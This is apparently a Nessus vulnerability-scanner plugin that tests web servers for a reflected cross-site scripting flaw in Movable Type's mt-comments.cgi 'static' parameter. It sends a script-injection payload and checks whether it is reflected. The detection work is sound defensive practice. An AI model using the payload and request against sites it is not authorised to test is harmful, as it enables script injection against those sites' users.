#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(54842);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2015/01/14 03:46:11 $");

  script_bugtraq_id(47997);

  script_name(english:"Movable Type mt-comments.cgi static Parameter XSS");
  script_summary(english:"Attempts a reflected XSS attack");

  script_set_attribute(
    attribute:"synopsis",
    value:
"An application hosted on the remote web server is affected by
a cross-site scripting vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of Movable Type running on the remote host is affected by a
cross-site scripting vulnerability because the application fails to
properly sanitize input to the 'static' parameter of the
'mt-comments.cgi' script.  An attacker may be able to leverage this to
inject arbitrary HTML and script code into a user's browser to be
executed within the security context of the affected site."
  );
  # http://www.movabletype.org/2011/05/movable_type_51_and_505_436_security_update.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?6c3bbf8b");
  script_set_attribute(attribute:"solution", value:"Upgrade to Movable Type version 4.36 / 5.05 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2011/05/24");
  script_set_attribute(attribute:"patch_publication_date", value:"2011/05/24");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/05/27");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:sixapart:movable_type");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2011-2015 Tenable Network Security, Inc.");

  script_dependencies("movabletype_detect.nasl");
  script_require_keys("www/movabletype");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80);
install = get_install_from_kb(appname:'movabletype', port:port, exit_on_fail:TRUE);

dir = install['dir'];
cgi = '/mt-comments.cgi';
xss = '"><script>alert(/' + SCRIPT_NAME+'-'+unixtime()+ '/)</script>';
qs = '__mode=handle_sign_in&logout=1&static=/' + xss;
expected_output = '/' + xss + '#_logout">';

exploited = test_cgi_xss(
  port:port,
  dirs:make_list(dir),
  cgi:cgi,
  qs:qs,
  pass_str:expected_output,
  ctrl_re:'<meta http-equiv="refresh"'
);

if (!exploited)
{
  install_url =  build_url(qs:dir, port:port);
  audit(AUDIT_WEB_APP_NOT_AFFECTED, "Movable Type", install_url);
}
